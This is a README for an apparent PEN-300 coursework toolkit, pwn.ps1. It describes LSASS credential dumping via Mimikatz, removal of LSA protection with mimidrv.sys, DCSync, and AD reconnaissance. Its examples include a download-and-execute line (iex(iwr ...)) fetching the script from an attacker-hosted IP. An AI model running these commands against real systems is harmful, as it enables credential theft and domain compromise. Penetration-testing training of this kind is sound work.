# osep_pwntools
Bespoke tooling for PEN-300 coursework

## pwn.ps1
This PowerShell utility script enumerates common host-based restrictions, such as whether LSA protection is disabled or AppLocker restrictions are in place.
If the system is domain-joined, the `adrecon` function is a wrapper utility for quick PowerView-based insights that can provide context for lateral movement opportunities.
The `getcreds` function is a wrapper utility for `Out-Minidump.ps1` and `Invoke-Mimikatz.ps1`, and can dump process memory from LSASS and parse out local credentials. If the `-lsa` flag is specified, it will load `mimidrv.sys` in order to remove this protection first. If the user has DCSync privileges it will also attempt to obtain them, as well as any trust link hashes.

**Note:** The `-ipaddress` specifies your IP address where the dependency scripts are being hosted (assumed on TCP/80). Use the `-port` option to specify a different port.
#### Examples

```powershell
iex(iwr 192.168.22.121/pwn.ps1 -usebasicparsing)
adrecon -ipaddress LHOST_IP

getcreds -ipaddress LHOST_IP
getcreds -ipaddress LHOST_IP -lsa
```
